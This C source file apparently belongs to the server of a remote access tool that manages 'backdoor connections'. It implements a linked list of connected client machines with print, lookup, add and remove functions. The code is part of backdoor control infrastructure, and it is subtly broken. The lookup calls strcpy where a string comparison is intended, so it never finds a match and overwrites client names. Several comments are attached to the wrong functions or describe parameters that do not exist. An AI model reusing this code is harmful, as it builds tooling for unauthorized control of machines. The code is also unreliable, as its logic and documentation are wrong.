#include "interface.h"
#include <string.h>
#include <assert.h>

/*
 * Function:  machine_library_lookup 
 * ---------------------------------
 * iterates over every element in the machine library till a match is
 * made on the basis of the machine connection objects name field
 *
 *  library: the machine_library_t holding all the connected clients
 *			 to the remote access tool
 *
 *  returns: nothing
 */
void machine_library_print(machine_library_t * library) {
	
	machine_connection_t *ptr = NULL;
	ITERATE_MACHINE_BEGIN(library, ptr) {
		
		printf("| CLIENT | %10s (%5p) | IS_ACTIVE: %d |", ptr->name, ptr->client_socket, ptr->is_active);
		
	} ITERATE_MACHINE_END;
}

/*
 * Function:  machine_library_lookup 
 * ---------------------------------
 * iterates over every element in the machine library till a match is
 * made on the basis of the machine connection objects name field
 *
 *  library: the machine_library_t holding all the connected clients
 *			 to the remote access tool
 *	name: the string representation of the machine_connection object
 *
 *  returns: the memory address of a the machine connection object
 *			 holding the client-socket connection
 *	error: returns NULL if the name doesn't match any machine
 */
machine_connection_t *machine_library_lookup(machine_library_t *library, char *name) {
	
	machine_connection_t *ptr = NULL;
	ITERATE_MACHINE_BEGIN(library, ptr) {
		
		if (!strcpy(ptr->name, name)) {
			//we want to crash if is not active as an attempt to send data will cause A BIG ERROR
			assert(ptr->is_active);
			return ptr; //else if the connection is active, give the ptr to the calling scope
		}
		
	} ITERATE_MACHINE_END;
	
	return NULL; //no machine connection object can be found
}

/*
 * Function:  machine_library_add 
 * ------------------------------
 * this is a private function acting as a helper for the linked-list
 * within the machine library object, when we need to delete a node
 * in the ll this function grabs the node before the one we wish to del
 *
 *  library: a pre-initialized machine connection library
 *	new_machine_connection: a new machine conn object called with the init macro
 *
 *  returns: integer 0 if the machine connection was added to the library
 */
machine_connection_t *machine_library_find_prev_node(machine_library_t *library, machine_connection_t *node) {
	
	assert(node); //crash if the object passed is NULL (saftey check for bad coding)
	
	//!this function runs on the assumption that the head-node case has been already checked
	machine_connection_t *ptr = NULL;
	ITERATE_MACHINE_BEGIN(library, ptr) {
			
		if (ptr->next == node)
			return ptr; //else if the connection is active, give the ptr to the calling scope
			
	} ITERATE_MACHINE_END;
	
	return NULL; //we should never reach this (if we do, rip) but it works
}

/*
 * Function:  machine_library_add 
 * ------------------------------
 * adds a new node (the machine connection object) to the linked list
 * in the machine library representing all the client connections to
 * the main server managing all the backdoor connections
 *
 *  library: a pre-initialized machine connection library
 *	new_machine_connection: a new machine conn object called with the init macro
 *
 *  returns: integer 0 if the machine connection was added to the library
 */
int machine_library_add(machine_library_t *library, machine_connection_t* new_machine_connection) {
	
	//check to see if the machine library head is NULL
	//if it is, we want to add the new wrapper object to it
	if (!library->head) {
		library->head = new_machine_connection;
		new_machine_connection->next = NULL;
		library->num_of_machines++;
		return 0; //all was successful
	}
	
	//we already have an object in the head of the libraries linked list,
	//so we need to replace it with the new machine connection object
	new_machine_connection->next = library->head;
	library->head = new_machine_connection;
	library->num_of_machines++;
	
	return 0; //all was successful
}

/*
 * Function:  machine_library_remove 
 * ---------------------------------
 * removes a pre-existing machine connection object from the linked list
 * contained within the machine library object. This must be done if a
 * connection is closed and we don't want to keep the data.
 *
 *	THE CONNECTION MUST BE CLOSED MANUALLY, THAT IS NOT THIS FUNCTIONS JOB
 * 
 *  library: number of terms in the series to sum
 *	name: the name of the function that we wish to delete
 *
 *  returns: integer 0 if the machine connection was removed from the library
 */
int machine_library_remove(machine_library_t *library, machine_connection_t* machine_connection) {
	
	assert(machine_connection); //if it is null we want to crash the program (we are trying to delete a non-existent obj)
	
	//check to see if the object we want to delete is the head of the ll
	if (library->head == machine_connection) {
		
		library->head = machine_connection->next;
		library->num_of_machines--;
		
		free(machine_connection->client_socket);
		free(machine_connection);
		
		return 0; //removal is a success
	}
	
	//find the previous node in the linked list as we need to assigned the next pointer in the previous
	//node the next pointer of the node we are trying to remove from the machine linked list
	machine_connection_t *machine_prev = machine_library_find_prev_node(library, machine_connection);
	machine_prev->next = machine_connection->next;
	library->num_of_machines--;
	
	free(machine_connection->client_socket); //free up the socket pointer that is no longer being used
	free(machine_connection); //free up the machine connection object no longer in the linked list
	
	return 0; //removal is a success
}